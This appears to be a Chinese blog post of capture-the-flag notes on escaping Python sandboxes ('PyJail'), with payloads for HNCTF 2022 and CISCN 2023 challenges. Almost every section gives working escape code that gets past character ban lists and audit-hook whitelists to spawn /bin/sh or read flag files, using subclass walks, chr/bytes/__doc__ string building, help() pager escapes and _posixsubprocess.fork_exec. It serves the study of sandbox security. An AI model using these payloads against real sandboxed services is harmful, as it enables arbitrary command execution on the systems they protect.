---
title: Python沙盒逃逸做题笔记
date: 2023-10-21 13:32:11
tags: PyJail
mathjax: true
---

# Python沙盒逃逸做题笔记

## [HNCTF 2022 Week1]python2 input(JAIL)

### 法一

payload1：

```python
__import__('os').system('sh')
```

### 法二

payload2：

```python
__builtins__.__import__('os').system('cat ./flag')
```

## [CISCN 2023 初赛]pyshell

>`-`：返回上一次运行语句的结果，可以进行字符串拼接。

输入长度不大于$7$。

### 法一

总payload：

```python
eval(open("/flag","r").read())
```

依次输入：

```python
"open"
_+'("/'
_+'fla'
_+'g"'
-+',"r'
_+'")'
_+'.'
_+'rea'
_+'d()'
eval(_)
```

### 法二

总payload：

```python
open('\flag').read()
```

依次输入：

```python
'/flag'
open(_)
_.read()
_()
```

## [HNCTF 2022 Week1]calc_jail_beginner_level1(JAIL)

> `__class__`：返回当前对象属于的类，例如`'a'.__class__`属于`str`类。
>
> `__base__`：返回当前类的基类。
>
> `__subclasses__`：返回当前类的所有子类。
>
> `__init__`：进行类的初始化操作。
>
> `__globals__`：返回全局变量。

BANLIST：

```
"'`ib
```

先通过以下语句得出所有子类：

```python
().__class__.__base__.__subclasses__()
```

因为“b”被禁，使用`getattr()`和`chr()`绕过。

payload1：

```python
getattr(getattr(().__class__,chr(95)+...+chr(95)),chr(95)+...+chr(95))()
```

找到类`os.wrap_close`，本题在$-4$位置。

总形式：

```python
().__class__.__base__.__subclass__()[-4].__init__.__globals__['system']('sh')
```

payload2：

```python
getattr(getattr(getattr(getattr(().__class__,chr(95)+chr(95)+chr(98)+chr(97)+chr(115)+chr(101)+chr(95)+chr(95)),chr(95)+chr(95)+chr(115)+chr(117)+chr(98)+chr(99)+chr(108)+chr(97)+chr(115)+chr(115)+chr(101)+chr(115)+chr(95)+chr(95))()[-4],chr(95)+chr(95)+chr(105)+chr(110)+chr(105)+chr(116)+chr(95)+chr(95)),chr(95)+chr(95)+chr(103)+chr(108)+chr(111)+chr(98)+chr(97)+chr(108)+chr(115)+chr(95)+chr(95))[chr(115)+chr(121)+chr(115)+chr(116)+chr(101)+chr(109)](chr(39)+chr(115)+chr(104)+chr(39))
```

## [HNCTF 2022 Week1]calc_jail_beginner_level2(JAIL)

> `__import__`：载入模块函数，例如载入`os`模块为`__import__('os')`。

输入长度不大于$13$。

payload1：

```python
breakpoint()
```

进入Pdb

payload2：

```python
eval(input())
__import__('os').system('sh')
```

## [HNCTF 2022 Week1]calc_jail_beginner_level2.5(JAIL)

限制13字符。

BANLIST：

```
exec input eval
```

同上。

## [HNCTF 2022 Week1]calc_jail_beginner_level3(JAIL)

限制$7$字符。

> 使用`help()`函数，随后获取`os`的帮助，因内容太多会使用`--More--`进行展示。在其后面使用`!cat flag`造成命令执行。

payload：

```
help()
os
!cat flag
```

## [HNCTF 2022 WEEK2]calc_jail_beginner_level4(JAIL)

BANLIST：

```
"\'` __loader__ __import__ compile eval exec chr
```

没有禁掉`b`，可以拿`bytes[]`造`system`。

payload1：

```python
().__class__.__base__.__subclasses__()[-4].__init__.__globals__[bytes([115,121,115,116,101,109]).decode()](bytes([115,104]).decode())
```

## [HNCTF 2022 WEEK2]calc_jail_beginner_level4.0.5(JAIL)

BANLIST：

```
__loader__ __import__ compile eval exec chr input locals globals "\'`
```

同上。

## [HNCTF 2022 WEEK2]calc_jail_beginner_level4.1(JAIL)

BANLIST：

```
__loader__ __import__ compile eval exec chr input locals globals bytes "\'`
```

`bytes`的子类索引为6。

payload1：

```python
().__class__.__base__.__subclasses__()[-4].__init__.__globals__[().__class__.__base__.__subclasses__()[6]([115,121,115,116,101,109]).decode()](().__class__.__base__.__subclasses__()[6]([115,104]).decode())
```

## [HNCTF 2022 WEEK2]calc_jail_beginner_level4.3(JAIL)

BANLIST：

```
__loader__ __import__ compile eval exec chr input locals globals bytes type open "\'`+
```

### 法一

同上

### 法二

> `__doc__`：返回默认类的帮助文档。

从`__doc__`中一个字符一个字符地找，`+`被禁，用`join()`代替。

payload1：

```python
().__class__.__base__.__subclasses__()[-4].__init__.__globals__[str().join([().__doc__[19],().__doc__[86],().__doc__[19],().__doc__[4],().__doc__[17],().__doc__[10]])](str().join([().__doc__[19],().__doc__[56]]))
```

## [HNCTF 2022 WEEK2]calc_jail_beginner_level5(JAIL)

> `__repr__`：“自我描述”功能。直接打印类的实例化对象时调用，输出自我描述信息。
>
> `__str__`：功能同上。但`__repr__`一般设置为开发者看，`__str__`给用户看。

需要注意的是：当不用`print`时，直接在交互命令行中输入该对象来输出时，走`__repr__`而不走`__str__`。

由程序可知输入的命令中`flag`被替换为`my_flag`，并禁止了`__repr__`和`__str__`。

根据提示可知payload1：

```python
dir()
```

随后如果直接输入：

```python
my_flag.flag_level5
```

则程序会走`__repr__`。为了绕过，使用`.join()`。payload2：

```python
str().join(my_flag.flag_level5)
```

## （疑问）[HNCTF 2022 WEEK3]calc_jail_beginner_level6(JAIL)

WHITELIST:

```
builtins.input builtins.input/result exec compile
```

> `__loader__`：加载器在导入的模块上设置的属性，访问时返回加载器对象本身。

### 法一

不知道这为啥能命中白名单...

payload1:

```python
import os
__loader__.load_module('_posixsubprocess').fork_exec([b"/bin/sh"], [b"/bin/sh"],True,(),None,None,-1,-1,-1,-1,-1,-1,*(os.pipe()),False,False,None,None,None,-1,None)
```

### 法二

payload2:

```python
exec("globals()['__builtins__']['set']=lambda x:['builtins.input','builtins.input/result','exec','compile','os.system']\nimport os\nos.system('/bin/sh')")
```

## （疑问）[HNCTF 2022 WEEK3]calc_jail_beginner_level7(JAIL)

这是为啥？

payload1:

```python
@exec
@input
class X:
    pass
--HNCTF
```

